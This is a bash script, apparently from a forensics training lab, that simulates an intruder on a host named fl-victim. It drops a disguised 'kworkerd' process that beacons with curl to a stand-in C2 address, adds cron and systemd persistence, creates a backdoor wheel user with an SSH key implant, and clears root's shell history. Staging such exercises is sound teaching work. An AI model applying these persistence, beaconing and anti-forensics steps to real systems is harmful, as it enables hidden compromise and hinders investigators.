#!/usr/bin/env bash
# simulate_intrusion.sh — plays a post-compromise attacker ON fl-victim only.
# Safe: touches nothing but this instance, downloads nothing, destroys nothing.
# It leaves the kind of traces a real intrusion would, for you to find later.
#
# Run it inside a Session Manager shell on fl-victim:
#   sudo bash simulate_intrusion.sh
set -uo pipefail

echo "[*] Simulated intrusion starting at $(date -u +%FT%TZ)"

# 1) Attacker drops a fake "miner" payload (just a sleep loop labelled like malware).
cat > /tmp/.x/kworkerd 2>/dev/null || { mkdir -p /tmp/.x && cat > /tmp/.x/kworkerd; } <<'PAYLOAD'
#!/bin/bash
# pretend-malware: beacons to a fake C2, then idles. Does nothing harmful.
while true; do
  curl -s --max-time 2 http://198.51.100.23/gate.php?id=$(hostname) >/dev/null 2>&1 || true
  sleep 60
done
PAYLOAD
chmod +x /tmp/.x/kworkerd

# 2) Run it so it shows up in process and network state during capture.
nohup /tmp/.x/kworkerd >/dev/null 2>&1 &
echo "[*] payload PID: $!"

# 3) Persistence via cron (a classic, easy-to-find technique).
echo '* * * * * root /tmp/.x/kworkerd' > /etc/cron.d/system-update
chmod 644 /etc/cron.d/system-update

# 4) Persistence via a rogue systemd-looking service file (not enabled, just dropped).
cat > /etc/systemd/system/kworkerd.service <<'UNIT'
[Unit]
Description=Kernel Worker Daemon
[Service]
ExecStart=/tmp/.x/kworkerd
Restart=always
[Install]
WantedBy=multi-user.target
UNIT

# 5) A backdoor user (no password login possible; just an artifact to discover).
useradd -M -s /bin/bash -c "backup service" backup-svc 2>/dev/null || true
usermod -aG wheel backup-svc 2>/dev/null || true

# 6) An SSH authorized_keys implant (fake key, for the investigator to find).
mkdir -p /home/backup-svc/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISIMULATEDkeyDOextNOTrealDONOTuse attacker@evil' \
  > /home/backup-svc/.ssh/authorized_keys
chmod 600 /home/backup-svc/.ssh/authorized_keys 2>/dev/null || true

# 7) Light anti-forensics: blank the shell history to mimic a tidy attacker.
cat /dev/null > /root/.bash_history 2>/dev/null || true

echo "[*] Simulated intrusion complete at $(date -u +%FT%TZ)"
echo "[*] Artifacts: /tmp/.x/kworkerd, /etc/cron.d/system-update,"
echo "    /etc/systemd/system/kworkerd.service, user backup-svc, SSH key, C2 198.51.100.23"
